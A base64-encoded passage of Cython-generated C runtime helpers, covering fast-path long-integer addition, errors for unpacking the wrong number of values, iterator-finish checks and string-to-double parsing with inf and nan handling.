XMgKCUiIENZVEhPTl9GT1JNQVRfU1NJWkVfVCAiZCBnaXZlbikiLAogICAgICAgICAgICAgICAgIGZ1bmNfbmFtZSwgbW9yZV9vcl9sZXNzLCBudW1fZXhwZWN0ZWQsCiAgICAgICAgICAgICAgICAgKG51bV9leHBlY3RlZCA9PSAxKSA/ICIiIDogInMiLCBudW1fZm91bmQpOwp9CgoKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9GYWxsYmFja19fX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBpbnQgaW5wbGFjZSkgewogICAgcmV0dXJuIChpbnBsYWNlID8gUHlOdW1iZXJfSW5QbGFjZUFkZCA6IFB5TnVtYmVyX0FkZCkob3AxLCBvcDIpOwp9CiNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9VbnBhY2tlZF9fX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBsb25nIGludHZhbCwgaW50IGlucGxhY2UsIGludCB6ZXJvZGl2aXNpb25fY2hlY2spIHsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGlucGxhY2UpOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoemVyb2RpdmlzaW9uX2NoZWNrKTsKICAgIGNvbnN0IGxvbmcgYiA9IGludHZhbDsKICAgIGxvbmcgYSwgeDsKI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICBjb25zdCBQWV9MT05HX0xPTkcgbGxiID0gaW50dmFsOwogICAgUFlfTE9OR19MT05HIGxsYSwgbGx4OwojZW5kaWYKICAgIGlmICh1bmxpa2VseShfX1B5eF9QeUxvbmdfSXNaZXJvKG9wMSkpKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihvcDIpOwogICAgfQogICAgaWYgKHVubGlrZWx5KCFfX1B5eF9QeUxvbmdfQ29tcGFjdEFzTG9uZyhvcDEsICZhKSkpIHsKICAgICAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyhvcDEpOwogICAgICAgIGNvbnN0IFB5X3NzaXplX3Qgc2l6ZSA9IF9fUHl4X1B5TG9uZ19TaWduZWREaWdpdENvdW50KG9wMSk7CiAgICAgICAgc3dpdGNoIChzaXplKSB7CiAgICAgICAgICAgIGNhc2UgLTI6CiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiAyICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICAgICAgYSA9IC0obG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKDggKiBzaXplb2YoUFlfTE9OR19MT05HKSAtIDEgPiAyICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICAgICAgbGxhID0gLShQWV9MT05HX0xPTkcpICgoKCgodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgZ290byBsb25nX2xvbmc7CiAgICAgICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICAgICAgY2FzZSAyOgogICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGEgPSAobG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKDggKiBzaXplb2YoUFlfTE9OR19MT05HKSAtIDEgPiAyICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICAgICAgbGxhID0gKFBZX0xPTkdfTE9ORykgKCgoKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBnb3RvIGxvbmdfbG9uZzsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgICAgICBjYXNlIC0zOgogICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGEgPSAtKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKDggKiBzaXplb2YoUFlfTE9OR19MT05HKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICAgICAgbGxhID0gLShQWV9MT05HX0xPTkcpICgoKCgoKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGdvdG8gbG9uZ19sb25nOwogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgICAgIGNhc2UgMzoKICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgICAgICAgICBhID0gKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKDggKiBzaXplb2YoUFlfTE9OR19MT05HKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICAgICAgbGxhID0gKFBZX0xPTkdfTE9ORykgKCgoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgZ290byBsb25nX2xvbmc7CiAgICAgICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICAgICAgY2FzZSAtNDoKICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDQgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgICAgICAgICBhID0gLShsb25nKSAoKCgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKDggKiBzaXplb2YoUFlfTE9OR19MT05HKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICAgICAgbGxhID0gLShQWV9MT05HX0xPTkcpICgoKCgoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBnb3RvIGxvbmdfbG9uZzsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgICAgICBjYXNlIDQ6CiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICAgICAgYSA9IChsb25nKSAoKCgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKDggKiBzaXplb2YoUFlfTE9OR19MT05HKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICAgICAgbGxhID0gKFBZX0xPTkdfTE9ORykgKCgoKCgoKCgodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGdvdG8gbG9uZ19sb25nOwogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgICAgIGRlZmF1bHQ6IHJldHVybiBQeUxvbmdfVHlwZS50cF9hc19udW1iZXItPm5iX2FkZChvcDEsIG9wMik7CiAgICAgICAgfQogICAgfQogICAgICAgICAgICB4ID0gYSArIGI7CiAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZyh4KTsKI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICBsb25nX2xvbmc6CiAgICAgICAgICAgIGxseCA9IGxsYSArIGxsYjsKICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21Mb25nTG9uZyhsbHgpOwojZW5kaWYKICAgIHJldHVybiBfX1B5eF9GYWxsYmFja19fX1B5eF9QeUxvbmdfQWRkT2JqQyhvcDEsIG9wMiwgaW5wbGFjZSk7CiAgICAKICAgIAp9CiNlbmRpZgpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X0Zsb2F0X19fUHl4X1B5TG9uZ19BZGRPYmpDKFB5T2JqZWN0ICpmbG9hdF92YWwsIGxvbmcgaW50dmFsLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUih6ZXJvZGl2aXNpb25fY2hlY2spOwogICAgY29uc3QgbG9uZyBiID0gaW50dmFsOwogICAgZG91YmxlIGEgPSBfX1B5eF9QeUZsb2F0X0FTX0RPVUJMRShmbG9hdF92YWwpOwogICAgICAgIGRvdWJsZSByZXN1bHQ7CiAgICAgICAgCiAgICAgICAgcmVzdWx0ID0gKChkb3VibGUpYSkgKyAoZG91YmxlKWI7CiAgICAgICAgcmV0dXJuIFB5RmxvYXRfRnJvbURvdWJsZShyZXN1bHQpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBsb25nIGludHZhbCwgaW50IGlucGxhY2UsIGludCB6ZXJvZGl2aXNpb25fY2hlY2spIHsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGludHZhbCk7CiAgICBDWVRIT05fVU5VU0VEX1ZBUih6ZXJvZGl2aXNpb25fY2hlY2spOwogICAgI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICAgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdChvcDEpKSkgewogICAgICAgIHJldHVybiBfX1B5eF9VbnBhY2tlZF9fX1B5eF9QeUxvbmdfQWRkT2JqQyhvcDEsIG9wMiwgaW50dmFsLCBpbnBsYWNlLCB6ZXJvZGl2aXNpb25fY2hlY2spOwogICAgfQogICAgI2VuZGlmCiAgICBpZiAoUHlGbG9hdF9DaGVja0V4YWN0KG9wMSkpIHsKICAgICAgICByZXR1cm4gX19QeXhfRmxvYXRfX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBpbnR2YWwsIHplcm9kaXZpc2lvbl9jaGVjayk7CiAgICB9CiAgICByZXR1cm4gX19QeXhfRmFsbGJhY2tfX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBvcDIsIGlucGxhY2UpOwp9CiNlbmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnKSB7CiAgICBQeU9iamVjdCAqYXJnc1syXSA9IHtOVUxMLCBhcmd9OwogICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGZ1bmMsIGFyZ3MrMSwgMSB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCk7Cn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JhaXNlVG9vTWFueVZhbHVlc0Vycm9yKFB5X3NzaXplX3QgZXhwZWN0ZWQpIHsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19WYWx1ZUVycm9yLAogICAgICAgICAgICAgICAgICJ0b28gbWFueSB2YWx1ZXMgdG8gdW5wYWNrIChleHBlY3RlZCAlIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQpIiwgZXhwZWN0ZWQpOwp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3IoUHlfc3NpemVfdCBpbmRleCkgewogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1ZhbHVlRXJyb3IsCiAgICAgICAgICAgICAgICAgIm5lZWQgbW9yZSB0aGFuICUiIENZVEhPTl9GT1JNQVRfU1NJWkVfVCAiZCB2YWx1ZSUuMXMgdG8gdW5wYWNrIiwKICAgICAgICAgICAgICAgICBpbmRleCwgKGluZGV4ID09IDEpID8gIiIgOiAicyIpOwp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0l0ZXJGaW5pc2godm9pZCkgewogICAgUHlPYmplY3QqIGV4Y190eXBlOwogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgZXhjX3R5cGUgPSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpOwogICAgaWYgKHVubGlrZWx5KGV4Y190eXBlKSkgewogICAgICAgIGlmICh1bmxpa2VseSghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV4Y190eXBlLCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpCiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICBfX1B5eF9QeUVycl9DbGVhcigpOwogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmV0dXJuIDA7Cn0KCgpzdGF0aWMgaW50IF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soUHlPYmplY3QgKnJldHZhbCwgUHlfc3NpemVfdCBleHBlY3RlZCkgewogICAgaWYgKHVubGlrZWx5KHJldHZhbCkpIHsKICAgICAgICBQeV9ERUNSRUYocmV0dmFsKTsKICAgICAgICBfX1B5eF9SYWlzZVRvb01hbnlWYWx1ZXNFcnJvcihleHBlY3RlZCk7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIF9fUHl4X0l0ZXJGaW5pc2goKTsKfQoKCnN0YXRpYyBkb3VibGUgX19QeXhfU2xvd1B5U3RyaW5nX0FzRG91YmxlKFB5T2JqZWN0ICpvYmopIHsKICAgIFB5T2JqZWN0ICpmbG9hdF92YWx1ZSA9IFB5RmxvYXRfRnJvbVN0cmluZyhvYmopOwogICAgaWYgKGxpa2VseShmbG9hdF92YWx1ZSkpIHsKICAgICAgICBkb3VibGUgdmFsdWUgPSBfX1B5eF9QeUZsb2F0X0FTX0RPVUJMRShmbG9hdF92YWx1ZSk7CiAgICAgICAgUHlfREVDUkVGKGZsb2F0X3ZhbHVlKTsKICAgICAgICByZXR1cm4gdmFsdWU7CiAgICB9CiAgICByZXR1cm4gKGRvdWJsZSktMTsKfQpzdGF0aWMgY29uc3QgY2hhciogX19QeXhfX1B5Qnl0ZXNfQXNEb3VibGVfQ29weShjb25zdCBjaGFyKiBzdGFydCwgY2hhciogYnVmZmVyLCBQeV9zc2l6ZV90IGxlbmd0aCkgewogICAgaW50IGxhc3Rfd2FzX3B1bmN0dWF0aW9uID0gMTsKICAgIGludCBwYXJzZV9lcnJvcl9mb3VuZCA9IDA7CiAgICBQeV9zc2l6ZV90IGk7CiAgICBmb3IgKGk9MDsgaSA8IGxlbmd0aDsgaSsrKSB7CiAgICAgICAgY2hhciBjaHIgPSBzdGFydFtpXTsKICAgICAgICBpbnQgaXNfcHVuY3R1YXRpb24gPSAoY2hyID09ICdfJykgfCAoY2hyID09ICcuJykgfCAoY2hyID09ICdlJykgfCAoY2hyID09ICdFJyk7CiAgICAgICAgKmJ1ZmZlciA9IGNocjsKICAgICAgICBidWZmZXIgKz0gKGNociAhPSAnXycpOwogICAgICAgIHBhcnNlX2Vycm9yX2ZvdW5kIHw9IGxhc3Rfd2FzX3B1bmN0dWF0aW9uICYgaXNfcHVuY3R1YXRpb247CiAgICAgICAgbGFzdF93YXNfcHVuY3R1YXRpb24gPSBpc19wdW5jdHVhdGlvbjsKICAgIH0KICAgIHBhcnNlX2Vycm9yX2ZvdW5kIHw9IGxhc3Rfd2FzX3B1bmN0dWF0aW9uOwogICAgKmJ1ZmZlciA9ICdcMCc7CiAgICByZXR1cm4gdW5saWtlbHkocGFyc2VfZXJyb3JfZm91bmQpID8gTlVMTCA6IGJ1ZmZlcjsKfQpzdGF0aWMgZG91YmxlIF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlX2luZl9uYW4oY29uc3QgY2hhciogc3RhcnQsIFB5X3NzaXplX3QgbGVuZ3RoKSB7CiAgICBpbnQgbWF0Y2hlcyA9IDE7CiAgICBjaGFyIHNpZ24gPSBzdGFydFswXTsKICAgIGludCBpc19zaWduZWQgPSAoc2lnbiA9PSAnKycpIHwgKHNpZ24gPT0gJy0nKTsKICAgIHN0YXJ0ICs9IGlzX3NpZ25lZDsKICAgIGxlbmd0aCAtPSBpc19zaWduZWQ7CiAgICBzd2l0Y2ggKHN0YXJ0WzBdKSB7CiAgICAgICAgI2lmZGVmIFB5X05BTgogICAgICAgIGNhc2UgJ24nOgogICAgICAgIGNhc2UgJ04nOgogICAgICAgICAgICBpZiAodW5saWtlbHkobGVuZ3RoICE9IDMpKSBnb3RvIHBhcnNlX2ZhaWx1cmU7CiAgICAgICAgICAgIG1hdGNoZXMgJj0gKHN0YXJ0WzFdID09ICdhJyB8fCBzdGFydFsxXSA9PSAnQScpOwogICAgICAgICAgICBtYXRjaGVzICY9IChzdGFydFsyXSA9PSAnbicgfHwgc3RhcnRbMl0gPT0gJ04nKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFtYXRjaGVzKSkgZ290byBwYXJzZV9mYWlsdXJlOwogICAgICAgICAgICByZXR1cm4gKHNpZ24gPT0gJy0nKSA/IC1QeV9OQU4gOiBQeV9OQU47CiAgICAgICAgI2VuZGlmCiAgICAgICAgY2FzZSAnaSc6CiAgICAgICAgY2FzZSAnSSc6CiAgICAgICAgICAgIGlmICh1bmxpa2VseShsZW5ndGggPCAzKSkgZ290byBwYXJzZV9mYWlsdXJlOwogICAgICAgICAgICBtYXRjaGVzICY9IChzdGFydFsxXSA9PSAnbicgfHwgc3RhcnRbMV0gPT0gJ04nKTsKICAgICAgICAgICAgbWF0Y2hlcyAmPSAoc3RhcnRbMl0gPT0gJ2YnIHx8IHN0YXJ0WzJdID09ICdGJyk7CiAgICAgICAgICAgIGlmIChsaWtlbHkobGVuZ3RoID09IDMgJiYgbWF0Y2hlcykpCiAgICAgICAgICAgICAgICByZXR1cm4gKHNpZ24gPT0gJy0nKSA/IC1QeV9IVUdFX1ZBTCA6IFB5X0hVR0VfVkFMOwogICAgICAgICAgICBpZiAodW5saWtlbHkobGVuZ3RoICE9IDgpKSBnb3RvIHBhcnNlX2ZhaWx1cmU7CiAgICAgICAgICAgIG1hdGNoZXMgJj0gKHN0YXJ0WzNdID09ICdpJyB8fCBzdGFydFszXSA9PSAnSScpOwogICAgICAgICAgICBtYXRjaGVzICY9IChzdGFydFs0XSA9PSAnbicgfHwgc3RhcnRbNF0gPT0gJ04nKTsKICAgICAgICAgICAgbWF0Y2hlcyAmPSAoc3RhcnRbNV0gPT0gJ2knIHx8IHN0YXJ0WzVdID09ICdJJyk7CiAgICAgICAgICAgIG1hdGNoZXMgJj0gKHN0YXJ0WzZdID09ICd0JyB8fCBzdGFydFs2XSA9PSAnVCcpOwogICAgICAgICAgICBtYXRjaGVzICY9IChzdGFydFs3XSA9PSAneScgfHwgc3RhcnRbN10gPT0gJ1knKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFtYXRjaGVzKSkgZ290byBwYXJzZV9mYWlsdXJlOwogICAgICAgICAgICByZXR1cm4gKHNpZ24gPT0gJy0nKSA/IC1QeV9IVUdFX1ZBTCA6IFB5X0hVR0VfVkFMOwogICAgICAgIGNhc2UgJy4nOiBjYXNlICcwJzogY2FzZSAnMSc6IGNhc2UgJzInOiBjYXNlICczJzogY2FzZSAnNCc6IGNhc2UgJzUnOiBjYXNlICc2JzogY2FzZSAnNyc6IGNhc2UgJzgnOiBjYXNlICc5JzoKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgZ290byBwYXJzZV9mYWlsdXJlOwogICAgfQogICAgcmV0dXJuIDAuMDsKcGFyc2VfZmFpbHVyZToKICAgIHJldHVybiAtMS4wOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fUHlCeXRlc19Bc0RvdWJsZV9Jc1NwYWNlKGNoYXIgY2gpIHsKICAgIHJldHVybiAoY2ggPT0gMHgyMCkgfCAhKChjaCA8IDB4OSkgfCAoY2ggPiAweGQpKTsKfQpDWVRIT05fVU5VU0VEIHN0YXRpYyBkb3VibGUgX19QeXhfX1B5Qnl0ZXNfQXNEb3VibGUoUHlPYmplY3QgKm9iaiwgY29uc3QgY2hhciogc3RhcnQsIFB5X3NzaXplX3QgbGVuZ3RoKSB7CiAgICBkb3VibGUgdmFsdWU7CiAgICBQeV9zc2l6ZV90IGksIGRpZ2l0czsKICAgIGNvbnN0IGNoYXIgKmxhc3QgPSBzdGFydCArIGxlbmd0aDsKICAgIGNoYXIgKmVuZDsKICAgIHdoaWxlIChfX1B5eF9fUHlCeXRlc19Bc0RvdWJsZV9Jc1NwYWNlKCpzdGFydCkpCiAgICAgICAgc3RhcnQrKzsKICAgIHdoaWxlIChzdGFydCA8IGxhc3QgLSAxICYmIF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlX0lzU3BhY2UobGFzdFstMV0pKQogICAgICAgIGxhc3QtLTsKICAgIGxlbmd0aCA9IGxhc3QgLSBzdGFydDsKICAgIGlmICh1bmxpa2VseShsZW5ndGggPD0gMCkpIGdvdG8gZmFsbGJhY2s7CiAgICB2YWx1ZSA9IF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlX2luZl9uYW4oc3RhcnQsIGxlbmd0aCk7CiAgICBpZiAodW5saWtlbHkodmFsdWUgPT0gLTEuMCkpIGdvdG8gZmFsbGJhY2s7CiAgICBpZiAodmFsdWUgIT0gMC4wKSByZXR1cm4gdmFsdWU7CiAgICBkaWdpdHMgPSAwOwogICAgZm9yIChpPTA7IGkgPCBsZW5ndGg7IGRpZ2l0cyArPSBzdGFydFtpKytdICE9ICdfJyk7CiAgICBpZiAobGlrZWx5KGRpZ2l0cyA9PSBsZW5ndGgpKSB7CiAgICAgICAgdmFsdWUgPSBQeU9TX3N0cmluZ190b19kb3VibGUoc3RhcnQsICZlbmQsIE5VTEwpOwogICAgfSBlbHNlIGlmIChkaWdpdHMgPCA0MCkgewogICAgICAgIGNoYXIgbnVtYmVyWzQwXTsKICAgICAgICBsYXN0ID0gX19QeXhfX1B5Qnl0ZXNfQXNEb3VibGVfQ29weShzdGFydCwgbnVtYmVyLCBsZW5ndGgpOwogICAgICAgIGlmICh1bmxpa2VseSghbGFzdCkpIGdvdG8gZmFsbGJhY2s7CiAgICAgICAgdmFsdWUgPSBQeU9TX3N0cmluZ190b19kb3VibGUobnVtYmVyLCAmZW5kLCBOVUxMKTsKICAgIH0gZWxzZSB7CiAgICAgICAgY2hhciAqbnVtYmVyID0gKGNoYXIqKSBQeU1lbV9NYWxsb2MoKGRpZ2l0cyArIDEpICogc2l6ZW9mKGNoYXIpKTsKICAgICAgICBpZiAodW5saWtlbHkoIW51bWJlcikpIGdvdG8gZmFsbGJhY2s7CiAgICAgICAgbGFzdCA9IF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlX0NvcHkoc3RhcnQsIG51bWJlciwgbGVuZ3RoKTsKICAgICAgICBpZiAodW5saWtlbHkoIWxhc3QpKSB7CiAgICAgICAgICAgIFB5TWVtX0ZyZWUobnVtYmVyKTsKICAgICAgICAgICAgZ290byBmYWxsYmFjazsKICAgICAgICB9CiAgICAgICAgdmFsdWUgPSBQeU9TX3N0cmluZ190b19kb3VibGUobnVtYmVyLCAmZW5kLCBOVUxMKTsKICAgICAgICBQeU1lbV9GcmVlKG51bWJlcik7CiAgICB9CiAgICBpZiAobGlrZWx5KGVuZCA9PSBsYXN0KSB8fCAodmFsdWUgPT0gKGRvdWJsZSktMSAmJiBQeUVycl9PY2N1cnJlZCgpKSkgewogICAgICAgIHJldHVybiB2YWx1ZTsKICAgIH0KZmFsbGJhY2s6CiAgICByZXR1cm4gX19QeXhfU2xvd1B5U3RyaW5nX0FzRG91YmxlKG9iaik7Cn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfX1B5TnVtYmVyX0Zsb2F0KFB5T2JqZWN0KiBvYmopIHsKICAgIGRvdWJsZSB2YWw7CiAgICBpZiAoUHlMb25nX0NoZWNrRXhhY3Qob2JqKSkgewojaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgICAgICAgaWYgKGxpa2VseShfX1B5eF9QeUxvbmdfSXNDb21wYWN0KG9iaikpKSB7CiAgICAgICAgICAgIHZhbCA9IChkb3VibGUpIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFs